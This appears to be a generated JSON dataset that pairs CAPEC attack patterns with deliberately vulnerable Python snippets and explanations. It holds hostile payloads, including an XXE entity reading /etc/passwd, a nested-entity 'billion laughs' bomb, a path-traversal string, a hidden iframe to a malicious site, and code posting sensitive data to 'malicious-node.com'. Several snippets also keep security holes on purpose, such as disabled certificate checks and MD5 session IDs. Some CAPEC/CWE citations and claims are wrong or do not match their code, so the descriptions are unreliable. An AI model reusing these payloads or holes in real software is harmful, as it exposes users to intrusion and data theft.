        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "import requests\n\n# Price per item set by the server\nprice_per_item = 100\n\n# Client-side calculation of total cost\n# Vulnerable to manipulation\nquantity = int(input('Enter quantity: '))\ntotal_cost = price_per_item * quantity\n\n# Attacker can modify the total_cost before sending to the server\n# For example, setting total_cost to a lower value\n# total_cost = 10\n\n# Sending the manipulated total cost to the server\nresponse = requests.post('https://example.com/purchase', data={'total_cost': total_cost})\n\nprint('Server response:', response.text)",
        "description": "This Python code snippet demonstrates a vulnerable client-side calculation of the total cost of items to be purchased. The server provides the price per item, and the client calculates the total cost based on the quantity input by the user. However, the client-side logic is susceptible to manipulation by an attacker, who can modify the total cost before sending it to the server. This can result in incorrect billing, allowing the attacker to make purchases at a fraction of the legitimate cost. The code embodies the main idea of CAPEC-Removing/short-circuiting 'Purse' logic and highlights related CWEs such as Client-Side Enforcement of Server-Side Security (CWE-602) and Incorrect Calculation (CWE-682)."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "from flask import Flask, request, send_file, make_response\nimport os\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    if file:\n        file.save(os.path.join('uploads', file.filename))\n        return 'File uploaded successfully'\n    return 'No file uploaded'\n\n@app.route('/serve/<filename>')\ndef serve_file(filename):\n    file_path = os.path.join('uploads', filename)\n    if os.path.exists(file_path):\n        response = make_response(send_file(file_path))\n        response.headers['Content-Type'] = 'text/plain'  # Incorrect MIME type\n        return response\n    return 'File not found', 404\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows file uploads and serves files to users. The main idea of the CAPEC is demonstrated by serving a file with an incorrect MIME type, which can lead to XSS attacks if the browser interprets the file content differently than the specified MIME type. The code includes the following vulnerabilities:\n\n1. **Improper Neutralization of Input During Web Page Generation (CWE-79)**: The application does not sanitize the file content before serving it, potentially allowing malicious scripts to be executed in the user's browser.\n2. **Improper Input Validation (CWE-20)**: The application does not validate the uploaded file's content, relying solely on the file name and extension.\n3. **Reliance on File Name or Extension of Externally-Supplied File (CWE-646)**: The application determines the behavior based on the file name and extension, which can be manipulated by an attacker.\n4. **Improper Neutralization of Script in Attributes of IMG Tags in a Web Page (CWE-82)** and **Improper Neutralization of Encoded URI Schemes in a Web Page (CWE-84)**: Although not directly demonstrated in this snippet, these weaknesses highlight the importance of proper input sanitization to prevent script injection through various vectors.\n\nThe code represents the main point of the CAPEC by showing how an adversary can exploit MIME type mismatches to execute arbitrary scripts in the victim's browser."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable to XSS due to improper neutralization of input\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>')\n\n@app.route('/error')\ndef error():\n    # Missing custom error page, exposing sensitive information\n    raise Exception('This is a test error!')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that embodies the main idea of the deprecated CAPEC pattern, leveraging web tools to change application behavior. The code includes vulnerabilities related to the listed CWEs. The '/search' route is vulnerable to Cross-Site Scripting (CWE-79) due to improper neutralization of user input in the 'query' parameter. The '/error' route raises an exception without a custom error page, potentially exposing sensitive information (CWE-7). This snippet highlights how improper handling of user input and lack of proper error handling can lead to security vulnerabilities."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import os\n\ndef read_sensitive_file(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError(f\"The file {file_path} does not exist.\")\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Example of functionality misuse\n# This function is intended to read non-sensitive files, but it can be misused to read sensitive system files\nsensitive_data = read_sensitive_file('/etc/passwd')\nprint(sensitive_data)",
        "description": "This Python code snippet demonstrates a functionality misuse vulnerability. The `read_sensitive_file` function is designed to read the contents of a file given its path. However, it does not restrict the types of files that can be read, allowing an adversary to misuse this function to access sensitive system files such as '/etc/passwd'. This embodies the main idea of the CAPEC by leveraging legitimate functionality in an unintended way to achieve a negative technical impact. The related CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is represented here, as the function does not prevent unauthorized access to sensitive system information."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/html'\n    full_path = os.path.join(base_directory, file_path)\n    \n    if not full_path.startswith(base_directory):\n        raise ValueError('Invalid file path')\n    \n    with open(full_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = '../../etc/passwd'\ntry:\n    content = read_file(user_input)\n    print(content)\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of file reading that is susceptible to path traversal attacks. The function `read_file` takes a `file_path` as input and constructs a full path by joining it with a base directory (`/var/www/html`). The code attempts to check if the constructed path starts with the base directory to prevent directory traversal. However, this check is insufficient because it does not properly neutralize sequences like '/../', '....', '...', '/dir/../filename', or '.../...//', which can resolve to locations outside the restricted directory. An attacker can exploit this vulnerability by providing input such as '../../etc/passwd' to read sensitive files outside the intended directory."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import socket\n\n# Direct use of sockets instead of a framework method call (CWE-246)\ndef fetch_data_from_server(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        s.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + host.encode() + b'\\r\\n\\r\\n')\n        response = s.recv(4096)\n        s.close()\n        return response\n    except Exception as e:\n        # Missing custom error page, exposing stack trace (CWE-7)\n        return str(e)\n\n# Example usage\nresponse = fetch_data_from_server('example.com', 80)\nprint(response)",
        "description": "This Python code snippet demonstrates a vulnerable approach to fetching data from a server by directly using sockets (CWE-246). The function `fetch_data_from_server` attempts to connect to a server and fetch data. If an error occurs, it catches the exception and returns the error message directly, potentially exposing sensitive information (CWE-7). This embodies the main idea of the deprecated CAPEC, which involves using fuzzing to garner stack traces for application mapping. The code is vulnerable because it does not use a higher-level framework for network communication and lacks proper error handling, which could expose internal details of the application."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "import random\nimport string\nimport logging\n\n# Configure logging\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Function to simulate processing of input\ndef process_input(user_input):\n    try:\n        # Simulate processing that could raise an error\n        if random.choice([True, False]):\n            raise ValueError('Simulated processing error')\n        return 'Processed successfully'\n    except ValueError as e:\n        # Log the error with sensitive information\n        logging.error(f'Error processing input: {user_input}, Error: {str(e)}')\n        return 'Error occurred'\n\n# Function to generate random input\ndef generate_random_input(length=10):\n    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\n\n# Simulate fuzzing by sending random inputs\nfor _ in range(100):\n    random_input = generate_random_input()\n    result = process_input(random_input)\n    print(result)",
        "description": "This Python code snippet simulates a fuzzing attack on an application by generating random inputs and processing them. The `process_input` function randomly raises a ValueError to simulate an error during processing. When an error occurs, it logs the error message along with the sensitive input data to a log file (`app.log`). This demonstrates the CAPEC concept of fuzzing for application mapping by observing error messages. The code also embodies related CWEs by logging sensitive information (CWE-532) and generating error messages that may contain sensitive information (CWE-209, CWE-210). The attacker can analyze the log file to gain insights into the application's behavior and potentially sensitive information."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 12345))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if data:\n        print(f'Received: {data.decode()}')\n        # No integrity check or authentication\n        client_socket.send(b'ACK')\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for incoming connections and processes data without proper authentication or integrity checks. The server accepts connections and receives data from clients, but it does not verify the source of the communication (CWE-940), ensure the integrity of the message (CWE-924), or authenticate the client (CWE-306). This makes the communication channel susceptible to manipulation, allowing an adversary to potentially compromise the security of the system (CAPEC-272)."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import ssl\nimport socket\n\n# Create an SSL context with incorrect configuration\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)\ncontext.verify_mode = ssl.CERT_NONE  # No certificate verification\n\n# Create a socket and wrap it with the SSL context\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nssl_sock = context.wrap_socket(sock, server_hostname='example.com')\n\n# Connect to the server\nssl_sock.connect(('example.com', 443))\n\n# Send sensitive data without proper encryption\nssl_sock.sendall(b'username=admin&password=secret')\n\n# Receive data from the server\nresponse = ssl_sock.recv(4096)\nprint(response.decode('utf-8'))\n\nssl_sock.close()",
        "description": "This Python code snippet demonstrates an SSL/TLS connection with incorrect configuration, embodying the main idea of CAPEC-640: 'Exploiting Incorrectly Configured SSL/TLS'. The code creates an SSL context with TLSv1 (an outdated protocol) and disables certificate verification (CWE-294: Authentication Bypass by Capture-replay). It then establishes a connection to a server and sends sensitive information (CWE-201: Insertion of Sensitive Information Into Sent Data) without proper encryption. This setup allows an adversary to intercept and manipulate the data, highlighting the risks of improper SSL/TLS configuration."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import requests\nimport xml.etree.ElementTree as ET\n\n# Simulate receiving an untrusted XML message\nuntrusted_xml = '''<message>\n    <business>FakeBusiness</business>\n    <wsdl>http://fakebusiness.com/wsdl</wsdl>\n    <protocol>SOAP</protocol>\n</message>'''\n\n# Parse the XML without validation (CWE-112)\nroot = ET.fromstring(untrusted_xml)\n\n# Extract business information\nbusiness = root.find('business').text\nwsdl = root.find('wsdl').text\nprotocol = root.find('protocol').text\n\n# Simulate sending a request to the extracted WSDL (CWE-941)\nresponse = requests.post(wsdl, data='<soapenv:Envelope>...</soapenv:Envelope>')\n\n# No verification of the response's authenticity or integrity (CWE-345, CWE-924)\nif response.status_code == 200:\n    print(f\"Transaction with {business} was successful.\")\nelse:\n    print(f\"Transaction with {business} failed.\")",
        "description": "This Python code snippet demonstrates a scenario where an attacker could spoof a UDDI/ebXML message to impersonate a service provider in an e-business transaction. The code parses an untrusted XML message without validation (CWE-112), extracts business information, and sends a request to the extracted WSDL without verifying the authenticity or integrity of the response (CWE-345, CWE-924). Additionally, the code does not correctly specify the intended destination for the communication (CWE-941), potentially allowing an attacker to manipulate the transaction. This could lead to disclosure of sensitive information, loss of message integrity, or financial fraud."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# Simulate receiving an XML message from an upstream component\nxml_message = '''\n<root>\n    <data>Some sensitive data</data>\n    <route>http://legitimate-node.com/process</route>\n</root>\n'''\n\n# Parse the XML message\nroot = etree.fromstring(xml_message)\n\n# Extract the route from the XML message\nroute = root.find('route').text\n\n# Simulate an attacker modifying the route\n# CWE-610: Externally Controlled Reference to a Resource in Another Sphere\nmalicious_route = 'http://malicious-node.com/process'\nroot.find('route').text = malicious_route\n\n# Forward the modified XML message to the new route\n# CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\nresponse = requests.post(malicious_route, data=etree.tostring(root))\n\n# Simulate the malicious node modifying the response\n# CWE-611: Improper Restriction of XML External Entity Reference\nmalicious_response = '''\n<root>\n    <data>Modified data</data>\n</root>\n'''\n\n# Forward the modified response back to the legitimate processing system\n# CWE-112: Missing XML Validation\nfinal_response = requests.post(route, data=malicious_response)\n\nprint(final_response.text)",
        "description": "This Python code snippet demonstrates an XML Routing Detour Attack. It simulates receiving an XML message, extracting a route, and then an attacker modifying this route to redirect the message to a malicious node. The malicious node then modifies the response and forwards it back to the legitimate processing system. The code highlights several vulnerabilities: CWE-610 (Externally Controlled Reference to a Resource in Another Sphere) by allowing the route to be modified, CWE-441 (Unintended Proxy or Intermediary) by forwarding the modified message, CWE-611 (Improper Restriction of XML External Entity Reference) by processing potentially malicious XML, and CWE-112 (Missing XML Validation) by not validating the XML before processing."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "import socket\nimport ssl\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wrap the socket with SSL, but allow for weak ciphers (CWE-757)\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS)\ncontext.set_ciphers('LOW')  # Allow weak ciphers\nwrapped_socket = context.wrap_socket(sock, server_hostname='example.com')\n\n# Connect to the server\nwrapped_socket.connect(('example.com', 443))\n\n# Send a request (CWE-602: Client-side enforcement of server-side security)\nrequest = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\nwrapped_socket.send(request.encode())\n\n# Receive the response\nresponse = wrapped_socket.recv(4096)\nprint(response.decode())\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a client-server protocol manipulation scenario. It creates a socket and wraps it with SSL, but deliberately allows weak ciphers (CWE-757: Algorithm Downgrade). The client then connects to a server and sends an HTTP request, relying on the client-side to enforce security (CWE-602: Client-Side Enforcement of Server-Side Security). This setup can be exploited by an adversary to perform unexpected actions due to the weak encryption and improper security enforcement."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY ext SYSTEM \"file:///dev/random\">\n]>\n<root>&ext;</root>\n'''\n\ntry:\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Data Serialization External Entities Blowup' (CAPEC). The code uses the `xml.etree.ElementTree` module to parse an XML document that includes an external entity reference. The external entity `ext` is defined to reference a system file URI (`file:///dev/random`). When the XML parser processes this entity, it attempts to read from `/dev/random`, which can cause the system to consume a large amount of resources, potentially leading to a denial of service (DoS) condition. This example embodies CWE-611 (Improper Restriction of XML External Entity Reference) by showing how an XML parser can be tricked into accessing external resources. The code also touches on CWE-99 (Improper Control of Resource Identifiers) by not restricting the input URI, allowing it to point to an unintended resource."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''<html>\n<head><title>Vulnerable Page</title></head>\n<body>\n    <h1>Welcome to the Vulnerable Page</h1>\n    <iframe src=\"http://malicious-site.com\" width=\"0\" height=\"0\" style=\"opacity:0;position:absolute;top:0;left:0;\"></iframe>\n</body>\n</html>'''\n\n@app.route('/xss')\ndef xss():\n    user_input = request.args.get('input', '')\n    return render_template_string(f'<html><body>{user_input}</body></html>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates an iFrame overlay attack. The main page includes an invisible iFrame that loads content from a malicious site, which can trick users into interacting with it unknowingly (CWE-1021). Additionally, the '/xss' route is vulnerable to Cross-site Scripting (CWE-79) as it directly injects user input into the HTML without proper sanitization. This combination of vulnerabilities can lead to user interface misrepresentation (CWE-451) and improper neutralization of script in attributes (CWE-82), making it easier for attackers to execute phishing attacks or other malicious activities."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "import platform\nimport socket\nimport os\n\n# Function to gather system information\ndef gather_system_info():\n    info = {}\n    info['os'] = platform.system()\n    info['os_version'] = platform.version()\n    info['hostname'] = socket.gethostname()\n    info['ip_address'] = socket.gethostbyname(info['hostname'])\n    info['cpu_info'] = platform.processor()\n    return info\n\n# Function to print system information\n# This represents the exposure of sensitive information (CWE-200, CWE-497)\ndef print_system_info():\n    info = gather_system_info()\n    for key, value in info.items():\n        print(f\"{key}: {value}\")\n\n# Function to simulate improper management of sensitive trace data (CWE-1323)\ndef log_trace_data():\n    trace_data = gather_system_info()\n    with open('trace_log.txt', 'w') as f:\n        for key, value in trace_data.items():\n            f.write(f\"{key}: {value}\\n\")\n\n# Main function to demonstrate fingerprinting\nif __name__ == '__main__':\n    print_system_info()\n    log_trace_data()",
        "description": "This Python code snippet demonstrates the concept of fingerprinting by gathering and exposing system information. The `gather_system_info` function collects details such as the operating system, version, hostname, IP address, and CPU information. The `print_system_info` function prints this information, representing the exposure of sensitive information (CWE-200, CWE-497). The `log_trace_data` function simulates improper management of sensitive trace data (CWE-1323) by writing the gathered information to a file. This code highlights how fingerprinting can be used to gather system details that could potentially be exploited by an adversary."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n# Simulated user database\nusers = {'user1': 'password1'}\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session_id = hashlib.md5(username.encode()).hexdigest()\n        sessions[session_id] = username\n        resp = make_response('Logged in')\n        resp.set_cookie('session_id', session_id)\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    session_id = request.cookies.get('session_id')\n    if session_id in sessions:\n        return f'Welcome {sessions[session_id]}'\n    return 'Unauthorized', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple web application using Flask that is vulnerable to session credential falsification through manipulation. The application has a login route that sets a session cookie without proper validation and integrity checking (CWE-565). The session ID is generated using a simple MD5 hash of the username, which is predictable and can be manipulated. The dashboard route relies on the session cookie to authenticate the user without verifying its integrity, making it susceptible to external control of assumed-immutable web parameters (CWE-472). Additionally, the session is not invalidated upon login (CWE-384), and there is no session expiration mechanism (CWE-613). The authentication is performed on the client side by setting a cookie, which can be bypassed by modifying the client (CWE-603)."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "import threading\nimport time\nimport requests\n\n# Function to simulate sustained client engagement\ndef engage_resource(url):\n    while True:\n        try:\n            response = requests.get(url)\n            # Simulate processing time\n            time.sleep(0.1)\n        except Exception as e:\n            print(f\"Error: {e}\")\n\n# URL of the target resource\ntarget_url = \"http://example.com/resource\"\n\n# Number of threads to simulate multiple clients\nnum_threads = 10\n\n# Create and start threads\nthreads = []\nfor _ in range(num_threads):\n    thread = threading.Thread(target=engage_resource, args=(target_url,))\n    thread.start()\n    threads.append(thread)\n\n# Join threads to keep the script running\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a sustained client engagement attack on a web resource. The code creates multiple threads, each of which continuously sends requests to a specified URL. This simulates multiple clients engaging the resource, potentially leading to resource exhaustion. The code embodies the main idea of CAPEC-400 by keeping the resource engaged without crashing or flooding it, thereby denying legitimate users access. The related CWEs are represented by the lack of resource allocation limits (CWE-770), uncontrolled resource consumption (CWE-400), and insufficient control of network message volume (CWE-406)."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>\n'''\n\ntry:\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a DTD Injection vulnerability, specifically an XML External Entity (XXE) attack. The XML data includes a Document Type Definition (DTD) that defines an external entity 'xxe' which references the system file '/etc/passwd'. When the XML parser processes this data, it attempts to include the contents of '/etc/passwd' in the XML document. This can lead to sensitive information disclosure. The code uses Python's xml.etree.ElementTree module to parse the XML data, which is vulnerable to such attacks if not properly configured to disable DTD processing. This example embodies the main idea of CAPEC-112 (DTD Injection) and highlights related weaknesses such as CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-827 (Improper Control of Document Type Definition)."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML parser without limits or throttling\nxml_data = '''<root>''' + ''.join([f'<item>{i}</item>' for i in range(1000000)]) + '''</root>'''\n\ntry:\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(f'Parsed {len(root)} items.')\nexcept ET.ParseError as e:\n    print(f'Failed to parse XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerable XML parser that can be exploited by an attacker to cause a denial of service (DoS) condition. The code constructs an XML document with a large number of 'item' elements, which can exhaust CPU resources during parsing. This embodies the main idea of the CAPEC 'Serialized Data Parameter Blowup' by exploiting the inefficiency in the XML parser. The related CWE-770 (Allocation of Resources Without Limits or Throttling) is represented by the lack of restrictions on the number of XML elements being parsed, leading to potential resource exhaustion."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data with nested entities\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY a \"1234567890\" >\n<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\" >\n<!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\" >\n<!ENTITY d \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\" >\n<!ENTITY e \"&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;\" >\n<!ENTITY f \"&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;\" >\n<!ENTITY g \"&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;\" >\n<!ENTITY h \"&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;\" >\n<!ENTITY i \"&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;\" >\n<!ENTITY j \"&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;\" >\n<!ENTITY k \"&j;&j;&j;&j;&j;&j;&j;&j;&j;&j;\" >\n<!ENTITY l \"&k;&k;&k;&k;&k;&k;&k;&k;&k;&k;\" >\n<!ENTITY m \"&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;\" >\n<!ENTITY n \"&m;&m;&m;&m;&m;&m;&m;&m;&m;&m;\" >\n<!ENTITY o \"&n;&n;&n;&n;&n;&n;&n;&n;&n;&n;\" >\n<!ENTITY p \"&o;&o;&o;&o;&o;&o;&o;&o;&o;&o;\" >\n<!ENTITY q \"&p;&p;&p;&p;&p;&p;&p;&p;&p;&p;\" >\n<!ENTITY r \"&q;&q;&q;&q;&q;&q;&q;&q;&q;&q;\" >\n<!ENTITY s \"&r;&r;&r;&r;&r;&r;&r;&r;&r;&r;\" >\n<!ENTITY t \"&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;\" >\n<!ENTITY u \"&t;&t;&t;&t;&t;&t;&t;&t;&t;&t;\" >\n<!ENTITY v \"&u;&u;&u;&u;&u;&u;&u;&u;&u;&u;\" >\n<!ENTITY w \"&v;&v;&v;&v;&v;&v;&v;&v;&v;&v;\" >\n<!ENTITY x \"&w;&w;&w;&w;&w;&w;&w;&w;&w;&w;\" >\n<!ENTITY y \"&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;\" >\n<!ENTITY z \"&y;&y;&y;&y;&y;&y;&y;&y;&y;&y;\" >\n]>\n<root>&z;</root>\n'''\n\ntry:\n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f\"Error parsing XML: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Serialized Data with Nested Payloads' (CAPEC). The XML data contains deeply nested entities, which can cause excessive memory consumption and CPU utilization when parsed. The code uses the xml.etree.ElementTree module to parse the XML data, which is vulnerable to such attacks due to the lack of proper validation and control over recursion depth. This example highlights the importance of validating XML against a schema (CWE-112), properly controlling recursion (CWE-674), and imposing limits on resource allocation (CWE-770)."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function that parses XML without validation\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        return tree\n    except ET.ParseError as e:\n        print(f'Parse error: {e}')\n\n# Example of an oversized XML payload\noversized_payload = '<root>' + '<child>' * 10000 + '</child>' * 10000 + '</root>'\n\n# Calling the vulnerable function with the oversized payload\nparse_xml(oversized_payload)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Oversized Serialized Data Payloads' (CAPEC). The function `parse_xml` takes an XML string as input and parses it without any validation against a schema (CWE-112). This lack of validation can lead to improper input handling (CWE-20). The example payload is an oversized XML string designed to exhaust system resources, potentially leading to uncontrolled recursion (CWE-674) and resource allocation issues (CWE-770). The code highlights the risk of relying on machine-dependent data representation (CWE-1102) when processing large or complex data structures without proper safeguards."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "import os\n\ndef check_admin_privileges():\n    try:\n        if os.geteuid() == 0:\n            print(\"Running as root\")\n        else:\n            print(\"Not running as root\")\n    except AttributeError:\n        print(\"Cannot determine privileges on this OS\")\n\n\ndef perform_sensitive_action():\n    print(\"Performing a sensitive action...\")\n\n\ndef main():\n    check_admin_privileges()\n    perform_sensitive_action()\n\nif __name__ == \"__main__\":\n    main()",
        "description": "This Python code snippet demonstrates a potential privilege escalation vulnerability. The `check_admin_privileges` function attempts to check if the script is running with root privileges using `os.geteuid()`. However, regardless of the privilege level, the `perform_sensitive_action` function is called, which represents a sensitive operation that should only be performed with proper privileges. This lack of proper privilege management (CWE-269) and improper handling of insufficient privileges (CWE-274) can lead to privilege escalation, where an unauthorized user could perform actions they are not supposed to be authorized to perform."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-250: Execution with Unnecessary Privileges\n# Running a process with elevated privileges\ntry:\n    # CWE-732: Incorrect Permission Assignment for Critical Resource\n    os.chmod('/path/to/critical/resource', 0o777)\n    \n    # CWE-648: Incorrect Use of Privileged APIs\n    subprocess.run(['sudo', 'some_privileged_command'], check=True)\n    \n    # CWE-114: Process Control\n    subprocess.run(['/path/to/untrusted/script.sh'], check=True)\nfinally:\n    # CWE-271: Privilege Dropping / Lowering Errors\n    os.setuid(os.getuid())  # Attempt to drop privileges\n",
        "description": "This Python code snippet demonstrates a scenario where an adversary could hijack a privileged process. The code runs a command with elevated privileges (CWE-250) and incorrectly assigns permissions to a critical resource (CWE-732). It also uses a privileged API call incorrectly (CWE-648) and executes a potentially malicious script from an untrusted source (CWE-114). Finally, it attempts to drop privileges but does so incorrectly (CWE-271). This combination of issues can allow an attacker to gain control of a privileged process and execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "import threading\nimport socket\n\n# Non-final static storable element\nshared_data = {'auth_token': None}\n\n# Function to simulate privileged operation\ndef privileged_operation(auth_token):\n    if auth_token == shared_data['auth_token']:\n        print('Privileged operation executed')\n    else:\n        print('Authentication failed')\n\n# Function to simulate network capture-replay attack\ndef capture_replay_attack():\n    captured_token = shared_data['auth_token']\n    # Replay the captured token\n    privileged_operation(captured_token)\n\n# Function to simulate setting the auth token\ndef set_auth_token(token):\n    shared_data['auth_token'] = token\n\n# Simulate setting the auth token\nset_auth_token('secure_token')\n\n# Create threads to simulate race condition and capture-replay attack\nthread1 = threading.Thread(target=privileged_operation, args=('secure_token',))\nthread2 = threading.Thread(target=capture_replay_attack)\n\n# Start the threads\nthread1.start()\nthread2.start()\n\n# Join the threads\nthread1.join()\nthread2.join()",
        "description": "This Python code snippet demonstrates a vulnerable scenario where a privileged operation can be hijacked due to improper handling of authentication tokens and race conditions. The shared_data dictionary represents a non-final static storable element that holds an authentication token. The privileged_operation function checks the token before executing a privileged action. The capture_replay_attack function simulates a capture-replay attack by reusing the captured token. The set_auth_token function sets the authentication token. Two threads are created to simulate a race condition and the capture-replay attack, highlighting the vulnerabilities described in the related CWEs."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
